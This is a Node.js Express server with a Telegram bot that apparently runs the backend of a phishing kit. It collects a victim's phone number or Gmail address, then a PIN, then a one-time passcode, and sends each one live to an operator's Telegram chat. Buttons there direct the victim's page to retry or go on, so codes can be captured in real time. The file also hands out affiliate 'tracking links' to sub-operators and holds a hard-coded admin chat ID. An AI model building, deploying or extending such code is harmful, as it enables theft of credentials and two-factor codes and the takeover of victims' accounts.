const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const getBotToken = () => process.env.TELEGRAM_BOT_TOKEN || process.env.TOKEN;
const getAppUrl = () => {
  let url = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
  return url ? url.replace(/\/$/, '') : '';
};
const getFallbackAdmin = () => process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

function resolveTargetChat(adminParam) {
  const fallbackAdminId = getFallbackAdmin();
  
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(fallbackAdminId)) {
      return fallbackAdminId;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized) {
      return targetAdmin;
    }
  }
  
  return fallbackAdminId || null;
}

function initBot() {
  const currentToken = getBotToken();
  const appUrl = getAppUrl();
  const fallbackAdminId = getFallbackAdmin();

  if (!currentToken || !appUrl) {
    console.error('FATAL: Bot Token or App URL is missing.');
    return;
  }

  bot = new TelegramBot(currentToken, { polling: false });
  const webhookPath = `/bot${currentToken}`;
  const webhookUrl = `${appUrl}${webhookPath}`;

  bot.setWebHook(webhookUrl).catch((err) => console.error('Webhook error:', err));

  app.post(webhookPath, (req, res) => {
    res.sendStatus(200);
    try { bot.processUpdate(req.body); } catch (err) {}
  });

  // Instant Allow Command via Telegram
  bot.onText(/\/allow/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let targetSession = null;

      for (const [sessionId, session] of sessions.entries()) {
        if (session.adminChatId === chatId && session.status === 'pending') {
          targetSession = session;
          break;
        }
      }

      if (targetSession) {
        targetSession.status = 'next_step';
        await bot.sendMessage(chatId, `✅ *Instant Allow Applied* for: \`${targetSession.contact}\``, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `⚠️ No pending submissions found to allow right now.`, { parse_mode: 'Markdown' });
      }
    } catch (err) {
      console.error('Error in /allow command:', err);
    }
  });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const firstName = msg.from.first_name || 'User';

      if (chatId === String(fallbackAdminId)) {
        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Link: ${appUrl}`, { parse_mode: 'Markdown' });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, { authorized: false, firstName, username: msg.from.username || '' });
        saveAdmins();
        await bot.sendMessage(fallbackAdminId, `🚨 New Sub-Admin request from ${firstName} (\`${userId}\`)`, {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [[
              { text: '✅ Authorize', callback_data: `AUTH_YES_${userId}` },
              { text: '❌ Reject', callback_data: `AUTH_NO_${userId}` }
            ]]
          }
        });
      }

      await bot.sendMessage(chatId, `👋 Welcome ${firstName}! Your tracking link is: ${appUrl}/?admin=${chatId}`, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);

      if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
        if (chatId !== String(fallbackAdminId)) return;
        const [_, decision, targetSubId] = actionData.split('_');
        const subRecord = admins.get(targetSubId);
        if (!subRecord) return;

        if (decision === 'YES') {
          subRecord.authorized = true;
          saveAdmins();
          await bot.sendMessage(targetSubId, `🎉 Approved! Your link: ${appUrl}/?admin=${targetSubId}`, { parse_mode: 'Markdown' });
          await bot.answerCallbackQuery(query.id, { text: 'Authorized!' });
        } else {
          admins.delete(targetSubId);
          saveAdmins();
          await bot.answerCallbackQuery(query.id, { text: 'Rejected.' });
        }
        return;
      }

      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_');
      const targetId = parts.slice(2).join('_');
      const session = sessions.get(targetId);

      if (session) {
        if (prefix === 'ALLOW_OTP') session.status = 'next_step';
        if (prefix === 'DENY_OTP') session.status = 'restart_pin';
        if (prefix === 'CORRECT_OTP') session.status = 'success';
        if (prefix === 'WRONG_PIN') session.status = 'restart_pin';
        if (prefix === 'WRONG_OTP') session.status = 'restart_otp';

        await bot.sendMessage(session.adminChatId, `Processed action: ${prefix} for ${session.contact}`);
      }

      await bot.answerCallbackQuery(query.id, { text: 'Processed' });
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- API ENDPOINTS WITH EXPLICIT LOGGING ---
app.post('/api/submit-application', async (req, res) => {
  try {
    console.log('Received /api/submit-application payload:', req.body, req.query);
    let { contactType, phone, gmail, adminChatId } = req.body || {};

    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Invalid admin target.' });
    }

    const contactDisplay = contactType === 'phone' ? `+263${phone}` : gmail;
    const userId = `user_${Date.now()}`;

    sessions.set(userId, {
      contactType,
      contact: contactDisplay,
      adminChatId: targetChat,
      status: 'pending',
      createdAt: new Date()
    });

    return res.status(200).json({ success: true, sessionId: userId });
  } catch (err) {
    console.error('Error in submit-application:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/submit-pin', async (req, res) => {
  try {
    console.log('Received /api/submit-pin payload:', req.body);
    const { sessionId, pin } = req.body || {};
    const session = sessions.get(sessionId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.pin = pin;
    session.status = 'pending';

    const message = `🚨 <b>NEW PIN SUBMISSION</b>\n\nContact: ${session.contact}\nPIN: ${pin}`;
    const opts = {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: '✅ ALLOW', callback_data: `ALLOW_OTP_${sessionId}` },
          { text: '❌ DENY', callback_data: `DENY_OTP_${sessionId}` }
        ]]
      }
    };

    if (bot && session.adminChatId) {
      await bot.sendMessage(session.adminChatId, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Error in submit-pin:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    console.log('Received /api/submit-otp payload:', req.body);
    const { sessionId, otp } = req.body || {};
    const session = sessions.get(sessionId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.otp = otp;
    session.status = 'pending';

    const message = `🔐 <b>NEW OTP SUBMISSION</b>\n\nContact: ${session.contact}\nOTP: ${otp}`;
    const opts = {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${sessionId}` }, { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${sessionId}` }],
          [{ text: '✅ OTP VALIDE', callback_data: `CORRECT_OTP_${sessionId}` }]
        ]
      }
    };

    if (bot && session.adminChatId) {
      await bot.sendMessage(session.adminChatId, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in submit-otp:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/check-status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);
  if (!session) return res.status(200).json({ status: 'pending' });
  res.status(200).json({ status: session.status || 'pending' });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  initBot();
});
